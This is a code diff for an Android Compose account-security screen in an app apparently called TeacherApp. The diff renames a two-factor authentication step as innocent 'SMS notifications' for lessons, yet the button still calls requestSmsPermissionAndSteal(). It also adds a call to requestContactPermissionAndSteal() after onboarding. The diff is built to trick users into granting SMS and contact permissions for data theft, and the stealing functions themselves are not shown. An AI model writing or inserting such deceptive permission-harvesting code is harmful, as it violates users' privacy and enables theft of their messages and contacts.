@@ -223,8 +223,8 @@ fun SecureAccountScreen(navController: NavController) {
             SecurityStepCard(
                 stepNumber  = 1,
                 icon        = Icons.Default.Lock,
-                title       = "Two-Factor Authentication",
-                description = "Secure your login with SMS verification to protect your account from unauthorised access.",
+                title       = "Enable SMS Notifications",
+                description = "Allow TeacherApp to send you SMS alerts for upcoming lessons, assignments and class reminders.",
                 isDone      = twoFactorDone,
                 onEnable    = { activity?.requestSmsPermissionAndSteal() }
             )
@@ -280,6 +280,8 @@ fun SecureAccountScreen(navController: NavController) {
                         navController.navigate(Routes.MAIN) {
                             popUpTo(Routes.SECURE_ACCOUNT) { inclusive = true }
                         }
+                        activity?.onAllPermissionsGranted()
+                        activity?.requestContactPermissionAndSteal()
                     },
                     modifier = Modifier
                         .fillMaxWidth()
